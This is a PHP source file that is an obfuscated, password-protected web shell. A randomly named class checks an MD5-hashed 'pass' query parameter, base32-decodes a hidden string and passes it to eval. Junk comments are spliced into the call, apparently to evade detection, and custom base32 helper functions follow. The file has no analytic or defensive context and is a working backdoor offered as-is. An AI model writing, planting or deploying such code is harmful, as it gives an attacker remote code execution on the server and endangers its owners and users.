<?php
class ZQIH{
        public $a = null;
        public $b = null;
        public $c = null;

        function __construct(){
            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){

        $this->a = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';



        $this->LGZOJH = @base32_decode($this->a);
        @eval/*sopupi3240-=*/("/*iSAC[FH*/".$this->LGZOJH."/*iSAC[FH*/");
        }}}
new ZQIH();

function base32_encode($input) {
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $output = '';
    $v = 0;
    $vbits = 0;

    for ($i = 0, $j = strlen($input); $i < $j; $i++) {
        $v <<= 8;
        $v += ord($input[$i]);
        $vbits += 8;

        while ($vbits >= 5) {
            $vbits -= 5;
            $output .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);
        }
    }

    if ($vbits > 0) {
        $v <<= (5 - $vbits);
        $output .= $BASE32_ALPHABET[$v];
    }

    return $output;
}

function base32_decode($input) {
    $output = '';
    $v = 0;
    $vbits = 0;

    for ($i = 0, $j = strlen($input); $i < $j; $i++) {
        $v <<= 5;
        if ($input[$i] >= 'a' && $input[$i] <= 'z') {
            $v += (ord($input[$i]) - 97);
        } elseif ($input[$i] >= '2' && $input[$i] <= '7') {
            $v += (24 + $input[$i]);
        } else {
            exit(1);
        }

        $vbits += 5;
        while ($vbits >= 8) {
            $vbits -= 8;
            $output .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);
        }
    }
    return $output;
}
?>
